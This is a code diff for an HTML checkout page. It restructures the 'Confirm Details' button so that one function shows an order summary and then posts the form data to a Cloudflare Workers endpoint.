@@ -218,12 +218,13 @@ hr {
     <div>
         <input type="text" id="postcode" name="postcode" required placeholder="Postcode">
     </div>
-    <div class="full-width">
-        <input type="button" value="Confirm Details" onclick="submitForm(),doSomethingElse();">
-    </div>
-</div>
+  <div class="full-width">
+                <input type="button" value="Confirm Details" onclick="confirmDetails()">
+            </div>
+        </form>
 
-    <div id="summary-list" style="display: none;"></div>
+        <div id="summary-list" style="display: none;"></div>
+    </div>
     <div class="card">
         <h3 class="card-title">Order Summary</h3>
         <div class="order-summary">
@@ -267,34 +268,7 @@ hr {
         updateTotal();
     });
 
-   function submitForm() {
-    // Get form data
-    var formData = new FormData(document.getElementById("checkout-form"));
-
-    // Send form data to Cloudflare Worker endpoint
-    fetch('https://worker-blue-wind-1446.bashirmubarak08.workers.dev/', {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.text();
-    })
-    .then(data => {
-        console.log(data); // Log response from server
-        // Optionally, display a success message
-       
-    })
-    .catch(error => {
-        console.error('There was a problem with the fetch operation:', error);
-        // Handle error condition
-        
-    });
-}
-    function doSomethingElse() {
-        // Get form data
+    function confirmDetails() {
         var formData = new FormData(document.getElementById("checkout-form"));
 
         // Compose summary list
@@ -315,8 +289,33 @@ hr {
         // Show the summary list
         summaryList.style.display = "block";
 
-        // Hide the form
-        document.getElementById("checkout-form").style.display = "none";
+        // Submit the form
+        submitForm();
+    }
+
+    function submitForm() {
+        // Get form data
+        var formData = new FormData(document.getElementById("checkout-form"));
+
+        // Send form data to Cloudflare Worker endpoint
+        fetch('https://worker-blue-wind-1446.bashirmubarak08.workers.dev/', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.text();
+        })
+        .then(data => {
+            console.log(data); // Log response from server
+            // Optionally, display a success message
+        })
+        .catch(error => {
+            console.error('There was a problem with the fetch operation:', error);
+            // Handle error condition
+        });
     }
 
 </script>
